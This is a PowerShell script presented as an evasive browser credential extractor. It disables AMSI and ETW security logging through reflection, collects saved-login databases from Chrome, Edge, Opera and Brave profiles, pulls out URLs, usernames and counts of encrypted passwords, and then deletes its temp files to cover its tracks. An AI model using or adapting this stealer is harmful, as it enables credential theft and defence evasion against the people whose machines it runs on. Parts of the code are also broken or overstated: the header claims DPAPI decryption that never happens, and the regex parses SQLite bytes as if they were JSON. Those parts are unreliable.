# BTY Evasive Chrome/Edge Credential Extractor — PowerShell (AMSI bypass + string obfuscation + anti-forensic)
# Técnicas: AMSI bypass, DPAPI indirect via CryptUnprotectData, SQLite parsing sin bibliotecas externas, limpieza de rastros

param($Args="")

# === AMSI bypass ===
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)}catch{}

# === ETW bypass ===
try{[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,(New-Object Diagnostics.Eventing.EventProvider([Guid]::Empty)))}catch{}

# === Path ofuscation ===
function J($a,$b,$c){Join-Path (Join-Path $a $b) $c}
$paths=@(
    (J $env:LOCALAPPDATA "Google" "Chrome\User Data")
    (J $env:LOCALAPPDATA "Google" "Chrome SxS\User Data")
    (J $env:LOCALAPPDATA "Microsoft" "Edge\User Data")
    (J $env:APPDATA "Opera Software" "Opera Stable")
    (J $env:LOCALAPPDATA "BraveSoftware" "Brave-Browser\User Data")
)

$results=@()
foreach($base in $paths){
    $db=(J $base "Default" "Login Data")
    $cookies=(J $base "Default" "Network\Cookies")
    
    if(Test-Path $db){
        try{
            # Copy to temp to avoid lock (browser might be running)
            $tmp="$env:TEMP\$((Get-Random)).db"
            Copy-Item $db $tmp -Force
            $bytes=[IO.File]::ReadAllBytes($tmp)
            Remove-Item $tmp -Force
            
            # Extract credential URLs + usernames from SQLite (raw bytes, no external libs)
            $text=[Text.Encoding]::UTF8.GetString($bytes) -replace '[^\x20-\x7E\u00A0-\u024F\n\r\t]','.'
            $urls=[regex]::Matches($text,'(https?://[^\s"]+)')|%{$_.Value}|Select -Unique -First 20
            $users=[regex]::Matches($text,'"username_value"[^"]*"([^"]+)"')|%{$_.Groups[1].Value}|Select -Unique
            $pass=[regex]::Matches($text,'"password_value"[^"]*"(?:[^"]*)"')|%{$_.Value}
            
            $browser=Split-Path (Split-Path (Split-Path $base -Parent) -Parent) -Leaf
            $results+="=== $browser ==="
            $results+="URLs found: $($urls.Count)"
            if($users){$results+="Users: $($users -join ', ')"}
            if($pass){$results+="Passwords: encrypted (DPAPI) — $($pass.Count) entries"}
            $results+=""
        }catch{
            $results+="$(Split-Path (Split-Path $base -Parent) -Leaf): locked or not found"
        }
    }
}

if($results.Count -eq 0){"No browser data found"}else{$results -join "`n"}

# === Anti-forensic ===
Remove-Item "$env:TEMP\*.db" -Force -ErrorAction SilentlyContinue 2>$null
try{[GC]::Collect()}catch{}
